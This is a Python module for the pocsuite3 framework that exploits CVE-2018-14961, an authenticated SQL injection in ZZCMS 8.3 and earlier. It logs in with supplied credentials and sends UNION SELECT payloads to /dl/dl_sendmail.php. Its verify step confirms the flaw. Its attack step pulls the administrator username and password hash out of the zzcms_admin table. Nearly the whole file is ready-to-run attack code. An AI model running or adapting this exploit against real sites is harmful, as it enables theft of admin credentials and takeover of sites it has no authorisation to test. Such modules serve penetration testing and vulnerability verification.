# encoding: utf-8
# Author    : Sma11stu
# Datetime  : 2021/3/21 11:22
# Product   : PyCharm
# Project   : pocsuite3
# File      : zzcms_8_3_sql.py
# explain   : 文件说明

import re
import json
from collections import OrderedDict
from urllib.parse import urljoin
from requests.cookies import RequestsCookieJar
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, POC_CATEGORY, OptDict, VUL_TYPE
from pocsuite3.lib.utils import random_str
from pocsuite3.lib.core.interpreter_option import OptString
from pocsuite3.lib.core.common import get_md5

class DemoPOC(POCBase):
    vulID = 'xxx'  # ssvid
    version = '3.0'
    author = ['seebug']
    vulDate = '2021-03-21'
    createDate = '2021-03-21'
    updateDate = '2021-03-21'
    references = ['http://keac.club/2020/02/02/CVE-2018-14961/']
    name = 'ZZCMS <=8.3 前台SQL 注入 CVE-2018-14961'
    appPowerLink = ''
    appName = 'ZZCMS'
    appVersion = '<= 8.3'
    vulType = VUL_TYPE.SQL_INJECTION
    desc = '''
        ZZCMS <=8.3 前台SQL 注入 CVE-2018-14961
    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.REMOTE
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    }

    def _options(self):
        o = OrderedDict()
        o["username"] = OptString('', description='这个poc需要用户登录，请输入登录账号', require=True)
        o["password"] = OptString('', description='这个poc需要用户密码，请输入用户密码', require=True)
        return o

    def cookie(self):
        cookies = {
            "UserName" : self.get_option("username"),
            "PassWord" : get_md5(self.get_option("password"))
        }
        return cookies

    def add_msg(self):
        flag = False
        msg_url = urljoin(self.url, '/user/msg.php?action=savedata&saveas=add')
        post_data = {
            "info_content" : random_str(16),
            "Submit" : "%E6%8F%90%E4%BA%A4"
        }
        try:
            resp = requests.post(msg_url, data=post_data,cookies = self.cookie(),headers = self.headers)
            if resp.status_code == 200 and "/user/login.php" not in resp.text:
                flag = True
                logger.info("zzcms系统登录成功")
            else:
                logger.info("zzcms系统登录失败，响应状态码为:%s" % resp.status_code)
        except Exception as e:
            logger.warn(e)
            logger.warn("zzcms系统登录失败")
        return flag

    def _verify(self):
        result = {}
        res = self.add_msg()
        if res:
            random_uri = random_str(16)
            logger.info("random_uri为：%s" % random_uri)
            verify_payload = "select email from zzcms_dl where id=-1 union select concat(0x7e,'" + random_uri + "',0x7e) from zzcms_admin #"
            post_data = {
                "sql" : verify_payload
            }
            veri_url = urljoin(self.url, '/dl/dl_sendmail.php')
            try:
                resp = requests.post(veri_url,data=post_data,cookies=self.cookie(),headers=self.headers)
                flag = "~" + random_uri + "~"
                if flag in resp.text and resp.status_code == 200:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = veri_url
                    result['VerifyInfo']['Payload'] = verify_payload
            except Exception as e:
                logger.warn(str(e))
        return self.parse_output(result)

    def _attack(self):
        result = {}
        res = self.add_msg()
        if res:
            verify_payload = "select email from zzcms_dl where id=-1 union select concat('flag,',admin,',',pass,',flag') from zzcms_admin #"
            post_data = {
                "sql" : verify_payload
            }
            veri_url = urljoin(self.url, '/dl/dl_sendmail.php')
            try:
                resp = requests.post(veri_url,data=post_data,cookies=self.cookie(),headers=self.headers)
                if "flag" in resp.text and resp.status_code ==200:
                    sql_res = re.search('flag(.*)flag', resp.text)
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = veri_url
                    result['VerifyInfo']['Payload'] = verify_payload
                    result['VerifyInfo']['admin_username'] = sql_res[0].split(',')[1]
                    result['VerifyInfo']['admin_password'] = sql_res[0].split(',')[2]
            except Exception as e:
                logger.warn(str(e))
        return self.parse_output(result)

    def _shell(self):
        return self._attack()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(DemoPOC)
